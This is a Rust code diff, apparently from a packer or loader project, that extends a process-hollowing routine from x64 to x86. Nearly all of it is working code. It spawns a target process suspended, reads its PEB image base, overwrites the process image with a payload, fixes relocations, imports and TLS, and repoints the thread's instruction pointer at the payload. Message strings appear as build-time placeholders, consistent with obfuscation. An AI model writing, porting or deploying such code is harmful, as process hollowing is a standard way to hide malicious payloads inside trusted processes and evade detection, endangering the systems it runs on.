@@ -2,7 +2,11 @@
 
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::{BOOL, HANDLE};
-use windows::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64};
+use windows::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FLAGS};
+#[cfg(target_arch = "x86_64")]
+use windows::Win32::System::Diagnostics::Debug::CONTEXT_FULL_AMD64;
+#[cfg(target_arch = "x86")]
+use windows::Win32::System::Diagnostics::Debug::CONTEXT_FULL_X86;
 use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 use windows::Win32::System::Memory::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
@@ -30,7 +34,36 @@ fn nt_error(label: String, status: i32) -> String {
 // --- PE constants ---
 const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
 const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
-const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
+
+/// The machine the payload must declare: the stub's own architecture (the packer
+/// rejects a mismatch at build time, this is the runtime backstop).
+#[cfg(target_arch = "x86_64")]
+const EXPECTED_MACHINE: u16 = 0x8664; // IMAGE_FILE_MACHINE_AMD64
+#[cfg(target_arch = "x86")]
+const EXPECTED_MACHINE: u16 = 0x014C; // IMAGE_FILE_MACHINE_I386
+
+/// `IMAGE_OPTIONAL_HEADER::ImageBase`, `NumberOfRvaAndSizes` and
+/// `DataDirectory`, which sit at different offsets in PE32 and PE32+.
+#[cfg(target_arch = "x86_64")]
+const IMAGE_BASE_OFFSET: usize = 24;
+#[cfg(target_arch = "x86")]
+const IMAGE_BASE_OFFSET: usize = 28;
+#[cfg(target_arch = "x86_64")]
+const NUM_DIRECTORIES_OFFSET: usize = 108;
+#[cfg(target_arch = "x86")]
+const NUM_DIRECTORIES_OFFSET: usize = 92;
+#[cfg(target_arch = "x86_64")]
+const DATA_DIRECTORY_OFFSET: usize = 112;
+#[cfg(target_arch = "x86")]
+const DATA_DIRECTORY_OFFSET: usize = 96;
+
+/// `TEB->ThreadLocalStoragePointer`: the per-thread array of module TLS blocks a
+/// CRT reads through `_tls_index` (`gs:[0x58]` / `fs:[0x2C]`). Its entries are
+/// pointer-sized.
+#[cfg(target_arch = "x86_64")]
+const TEB_TLS_ARRAY_OFFSET: u64 = 0x58;
+#[cfg(target_arch = "x86")]
+const TEB_TLS_ARRAY_OFFSET: u64 = 0x2C;
 
 /// Minimal section header view.
 struct Section {
@@ -41,12 +74,29 @@ struct Section {
 }
 
 /// `GetThreadContext`/`SetThreadContext` require a 16-byte aligned `CONTEXT`
-/// on x64; the `windows` binding only guarantees 8, so force it here.
+/// on x64; the `windows` binding only guarantees 8, so force it here. (x86 has
+/// no such requirement; the alignment is harmless there.)
 #[repr(align(16))]
 struct AlignedContext(CONTEXT);
 
+/// `CONTEXT_FULL` for the stub's architecture: what `resolve_image_base`,
+/// `thread_rip` and `redirect_entry` ask for.
+#[cfg(target_arch = "x86_64")]
+const CONTEXT_FLAGS_FULL: CONTEXT_FLAGS = CONTEXT_FULL_AMD64;
+#[cfg(target_arch = "x86")]
+const CONTEXT_FLAGS_FULL: CONTEXT_FLAGS = CONTEXT_FULL_X86;
+
+/// `PEB->ImageBaseAddress`: `+0x10` on x64, `+0x08` on x86 (the 32-bit PEB has
+/// `Mutant` where the 64-bit one has padding).
+#[cfg(target_arch = "x86_64")]
+const PEB_IMAGE_BASE_OFFSET: u64 = 0x10;
+#[cfg(target_arch = "x86")]
+const PEB_IMAGE_BASE_OFFSET: u64 = 0x08;
+
 /// Minimal PE view.
 struct Pe {
+    /// The payload's preferred base, widened to `u64` on x86 so the relocation
+    /// arithmetic stays shared.
     image_base: u64,
     size_of_image: u32,
     size_of_headers: u32,
@@ -93,9 +143,9 @@ fn parse_pe(image: &[u8]) -> Result<Pe, String> {
     }
 
     let machine = read_u16(image, e_lfanew + 4)?;
-    if machine != IMAGE_FILE_MACHINE_AMD64 {
+    if machine != EXPECTED_MACHINE {
         return Err(format!(
-            "{} (machine 0x{machine:04x}); expected x64",
+            "{} (machine 0x{machine:04x})",
             $MSG_BAD_ARCH$
         ));
     }
@@ -105,26 +155,40 @@ fn parse_pe(image: &[u8]) -> Result<Pe, String> {
 
     let opt = e_lfanew + 4 + 20;
     let entry_point_rva = read_u32(image, opt + 16)?;
-    let image_base = read_u64(image, opt + 24)?;
+    // PE32+ stores `ImageBase` as a `u64` at 24; PE32 as a `u32` at 28 (reading
+    // only the low half of a 64-bit base skews every relocation by 4 GB).
+    #[cfg(target_arch = "x86_64")]
+    let image_base = read_u64(image, opt + IMAGE_BASE_OFFSET)?;
+    #[cfg(target_arch = "x86")]
+    let image_base = read_u32(image, opt + IMAGE_BASE_OFFSET)? as u64;
     let size_of_image = read_u32(image, opt + 56)?;
     let size_of_headers = read_u32(image, opt + 60)?;
 
     // Base relocation directory (data directory index 5).
-    let num_dirs = read_u32(image, opt + 108)?;
+    let num_dirs = read_u32(image, opt + NUM_DIRECTORIES_OFFSET)?;
     let (reloc_rva, reloc_size) = if num_dirs > 5 {
-        (read_u32(image, opt + 152)?, read_u32(image, opt + 156)?)
+        (
+            read_u32(image, opt + DATA_DIRECTORY_OFFSET + 40)?,
+            read_u32(image, opt + DATA_DIRECTORY_OFFSET + 44)?,
+        )
     } else {
         (0, 0)
     };
     // Import directory (data directory index 1).
     let (import_rva, import_size) = if num_dirs > 1 {
-        (read_u32(image, opt + 120)?, read_u32(image, opt + 124)?)
+        (
+            read_u32(image, opt + DATA_DIRECTORY_OFFSET + 8)?,
+            read_u32(image, opt + DATA_DIRECTORY_OFFSET + 12)?,
+        )
     } else {
         (0, 0)
     };
     // TLS directory (data directory index 9).
     let (tls_rva, tls_size) = if num_dirs > 9 {
-        (read_u32(image, opt + 184)?, read_u32(image, opt + 188)?)
+        (
+            read_u32(image, opt + DATA_DIRECTORY_OFFSET + 72)?,
+            read_u32(image, opt + DATA_DIRECTORY_OFFSET + 76)?,
+        )
     } else {
         (0, 0)
     };
@@ -169,7 +233,7 @@ fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
     None
 }
 
-fn apply_relocations(image: &mut [u8], pe: &Pe, delta: isize) -> Result<(), String> {
+fn apply_relocations(image: &mut [u8], pe: &Pe, delta: u64) -> Result<(), String> {
     if pe.reloc_size == 0 {
         return Ok(());
     }
@@ -203,12 +267,14 @@ fn apply_relocations(image: &mut [u8], pe: &Pe, delta: isize) -> Result<(), Stri
                 // half of every relocated pointer.
                 10 => {
                     let v = read_u64(image, file_off)?;
-                    write_u64(image, file_off, (v as isize + delta) as u64)?;
+                    write_u64(image, file_off, v.wrapping_add(delta))?;
                 }
-                // IMAGE_REL_BASED_HIGHLOW (3): patch a 32-bit field.
+                // IMAGE_REL_BASED_HIGHLOW (3): patch a 32-bit field. What an x86
+                // image emits for absolute addresses (and what a 64-bit one uses
+                // for its rare 32-bit fields).
                 3 => {
                     let v = read_u32(image, file_off)?;
-                    write_u32(image, file_off, (v as isize + delta) as u32)?;
+                    write_u32(image, file_off, (v as u64).wrapping_add(delta) as u32)?;
                 }
                 // ABSOLUTE and everything else: skip.
                 _ => {}
@@ -237,7 +303,7 @@ fn resolve_and_patch_imports(image: &mut [u8], pe: &Pe) -> Result<usize, String>
         // Process hollowing writes into a file-layout buffer, not a mapped image,
         // and the proxies live in this (loader) process, not in the target, so no
         // API resolution is wired here yet (phase E).
-        |_, _| None,
+        |_, _| crate::ImportPolicy::Forward,
     )
     .map_err(|e| format!("{}: {e}", $MSG_RESOLVE_IMPORTS$))?;
 
@@ -316,8 +382,10 @@ fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, Stri
         pe.size_of_image
     );
 
-    // 7. Fix up relocations if the base differs from the preferred one.
-    let delta = address as isize - pe.image_base as isize;
+    // 7. Fix up relocations if the base differs from the preferred one. The
+    //    delta is a wrapping difference, so it works for a 32-bit image whose
+    //    base is above `i32::MAX` as well.
+    let delta = address.wrapping_sub(pe.image_base);
     if delta != 0 {
         apply_relocations(image, pe, delta)?;
         crate::tech_dbg!(
@@ -408,7 +476,7 @@ fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE), String> {
 
 fn resolve_image_base(process: HANDLE, thread: HANDLE) -> Result<u64, String> {
     let mut ctx = AlignedContext(CONTEXT::default());
-    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
+    ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
     let status = crate::nt_get_context_thread(
         thread,
         &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
@@ -417,12 +485,18 @@ fn resolve_image_base(process: HANDLE, thread: HANDLE) -> Result<u64, String> {
         return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
     }
 
-    // On x64, Rdx holds the PEB address; ImageBaseAddress sits at PEB + 0x10.
+    // The suspended thread's context carries the PEB: `Rdx` on x64, `Ebx` on
+    // x86 (both set by the kernel for a fresh process).
+    #[cfg(target_arch = "x86_64")]
     let peb = ctx.0.Rdx;
-    let mut base: u64 = 0;
-    read_remote(process, peb + 0x10, &mut base)?;
+    #[cfg(target_arch = "x86")]
+    let peb = ctx.0.Ebx as u64;
+    // `ImageBaseAddress` is pointer-sized: 4 bytes in the 32-bit PEB, 8 in the
+    // 64-bit one (reading only the low half yields a truncated base).
+    let mut base: usize = 0;
+    read_remote(process, peb + PEB_IMAGE_BASE_OFFSET, &mut base)?;
 
-    Ok(base)
+    Ok(base as u64)
 }
 
 /// Reads the target's `AddressOfEntryPoint` from its mapped headers and returns
@@ -503,7 +577,7 @@ fn run_loader_and_wait(thread: HANDLE, target_entry: u64) -> Result<(), String> 
 /// Returns the thread's current instruction pointer.
 fn thread_rip(thread: HANDLE) -> Result<u64, String> {
     let mut ctx = AlignedContext(CONTEXT::default());
-    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
+    ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
     let status = crate::nt_get_context_thread(
         thread,
         &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
@@ -511,7 +585,10 @@ fn thread_rip(thread: HANDLE) -> Result<u64, String> {
     if status < 0 {
         return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
     }
-    Ok(ctx.0.Rip)
+    #[cfg(target_arch = "x86_64")]
+    return Ok(ctx.0.Rip);
+    #[cfg(target_arch = "x86")]
+    return Ok(ctx.0.Eip as u64);
 }
 
 /// Resolves `LoadLibraryA`'s address in the current process.
@@ -713,11 +790,11 @@ fn write_remote(process: HANDLE, base: u64, data: &[u8]) -> Result<(), String> {
 const TLS_OUT_OF_INDEXES: u32 = u32::MAX;
 /// `ThreadBasicInformation` for `NtQueryInformationThread`.
 const THREAD_BASIC_INFORMATION: i32 = 0;
-/// `ThreadLocalStoragePointer`'s offset in the x64 TEB: the per-thread array
-/// `TlsGetValue`/`TlsSetValue` and the CRT's thread-locals go through.
-const TEB_TLS_ARRAY_OFFSET: u64 = 0x58;
 
-/// `THREAD_BASIC_INFORMATION` as the kernel lays it out on x64.
+/// `THREAD_BASIC_INFORMATION` as the kernel lays it out: the TEB pointer is
+/// pointer-sized and follows the exit status directly on x86, while x64 pads the
+/// status to eight bytes.
+#[cfg(target_arch = "x86_64")]
 #[repr(C)]
 #[derive(Default)]
 struct ThreadBasicInformation {
@@ -729,6 +806,19 @@ struct ThreadBasicInformation {
     teb_base_address: u64,
     _client_id: [u64; 2],
     _affinity_mask: u64,
+    _priority: i32,
+    _base_priority: i32,
+}
+
+/// `THREAD_BASIC_INFORMATION` on x86 (no padding around the exit status).
+#[cfg(target_arch = "x86")]
+#[repr(C)]
+#[derive(Default)]
+struct ThreadBasicInformation {
+    exit_status: i32,
+    teb_base_address: u32,
+    _client_id: [u32; 2],
+    _affinity_mask: u32,
     _priority: i32,
     _base_priority: i32,
 }
@@ -758,14 +848,25 @@ fn parse_tls(image: &[u8], pe: &Pe) -> Result<Option<TlsInfo>, String> {
     }
     let dir = rva_to_offset(pe, pe.tls_rva)
         .ok_or_else(|| $MSG_TLS_DIR_UNMAPPED$)?;
-    // IMAGE_TLS_DIRECTORY64: StartAddressOfRawData (+0), EndAddressOfRawData
-    // (+8), AddressOfIndex (+16), AddressOfCallBacks (+24), SizeOfZeroFill
-    // (+32), Characteristics (+36).
-    let raw_start = read_u64(image, dir)?;
-    let raw_end = read_u64(image, dir + 8)?;
-    let index_va = read_u64(image, dir + 16)?;
-    let callbacks_va = read_u64(image, dir + 24)?;
-    let zero_fill = read_u32(image, dir + 32)? as usize;
+    // IMAGE_TLS_DIRECTORY: StartAddressOfRawData, EndAddressOfRawData,
+    // AddressOfIndex, AddressOfCallBacks (all pointer-sized), then SizeOfZeroFill
+    // and Characteristics (both 32-bit). PE32 has them 4 bytes earlier each.
+    #[cfg(target_arch = "x86_64")]
+    let (raw_start, raw_end, index_va, callbacks_va, zero_fill) = (
+        read_u64(image, dir)?,
+        read_u64(image, dir + 8)?,
+        read_u64(image, dir + 16)?,
+        read_u64(image, dir + 24)?,
+        read_u32(image, dir + 32)? as usize,
+    );
+    #[cfg(target_arch = "x86")]
+    let (raw_start, raw_end, index_va, callbacks_va, zero_fill) = (
+        read_u32(image, dir)? as u64,
+        read_u32(image, dir + 4)? as u64,
+        read_u32(image, dir + 8)? as u64,
+        read_u32(image, dir + 12)? as u64,
+        read_u32(image, dir + 16)? as usize,
+    );
     Ok(Some(TlsInfo {
         index_va,
         callbacks_va,
@@ -821,17 +922,29 @@ fn give_thread_tls(process: HANDLE, thread: HANDLE, ctx: &TlsContext) -> Result<
         write_remote(process, block as u64, &ctx.image[offset..end])?;
     }
 
-    let teb = thread_basic_information(thread)?.teb_base_address;
+    let teb = thread_basic_information(thread)?.teb_base_address as u64;
     let mut tls_array = 0u64;
     read_remote(process, teb + TEB_TLS_ARRAY_OFFSET, &mut tls_array)?;
     if tls_array == 0 {
         return Err($MSG_NO_TLS_ARRAY$);
     }
-    write_remote(
-        process,
-        tls_array + u64::from(ctx.index) * 8,
-        &(block as u64).to_le_bytes(),
-    )
+    // The array's entries are pointer-sized: 4 bytes on x86, 8 on x64.
+    #[cfg(target_arch = "x86_64")]
+    {
+        write_remote(
+            process,
+            tls_array + u64::from(ctx.index) * 8,
+            &(block as u64).to_le_bytes(),
+        )
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        write_remote(
+            process,
+            tls_array + u64::from(ctx.index) * 4,
+            &(block as u32).to_le_bytes(),
+        )
+    }
 }
 
 /// Provisions the payload's TLS in the target, then runs its callbacks.
@@ -932,7 +1045,7 @@ fn thread_basic_information(thread: HANDLE) -> Result<ThreadBasicInformation, St
 
 fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), String> {
     let mut ctx = AlignedContext(CONTEXT::default());
-    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
+    ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
     let status = crate::nt_get_context_thread(
         thread,
         &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
@@ -942,11 +1055,19 @@ fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), Strin
     }
     // The thread is parked in the entry-point spin loop of the process's
     // *original* image, which has been unmapped and replaced. Point it at the
-    // payload's entry point: `Rip` is what actually runs, `Rcx` carries the
-    // payload's first argument for the ABIs that expect one.
+    // payload's entry point: `Rip`/`Eip` is what actually runs. On x64 `Rcx`
+    // also carries the payload's first argument for the ABIs that expect one;
+    // x86 passes its arguments on the stack, so there is no register to set.
     let entry = base + entry_rva as u64;
-    ctx.0.Rip = entry;
-    ctx.0.Rcx = entry;
+    #[cfg(target_arch = "x86_64")]
+    {
+        ctx.0.Rip = entry;
+        ctx.0.Rcx = entry;
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        ctx.0.Eip = entry as u32;
+    }
     let status = crate::nt_set_context_thread(
         thread,
         &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
@@ -991,9 +1112,10 @@ fn wait_and_exit(process: HANDLE) -> Result<i32, String> {
 
 // --- Bounds-checked little-endian reads/writes ---
 
-/// `PROCESS_BASIC_INFORMATION` as the kernel lays it out on x64. Only the first
-/// field is read (the target's exit status); the rest keeps the layout right so
-/// the kernel writes into a correctly sized buffer.
+/// `PROCESS_BASIC_INFORMATION` as the kernel lays it out: only the first field
+/// is read (the target's exit status); the rest keeps the layout right so the
+/// kernel writes into a correctly sized buffer.
+#[cfg(target_arch = "x86_64")]
 #[repr(C)]
 #[derive(Default)]
 struct ProcessBasicInformation {
@@ -1004,6 +1126,19 @@ struct ProcessBasicInformation {
     _padding: i32,
     _unique_process_id: u64,
     _parent_process_id: u64,
+}
+
+/// `PROCESS_BASIC_INFORMATION` on x86 (all fields 32-bit).
+#[cfg(target_arch = "x86")]
+#[repr(C)]
+#[derive(Default)]
+struct ProcessBasicInformation {
+    exit_status: i32,
+    _peb_base_address: u32,
+    _affinity_mask: u32,
+    _base_priority: i32,
+    _unique_process_id: u32,
+    _parent_process_id: u32,
 }
 
 fn read_u16(b: &[u8], off: usize) -> Result<u16, String> {
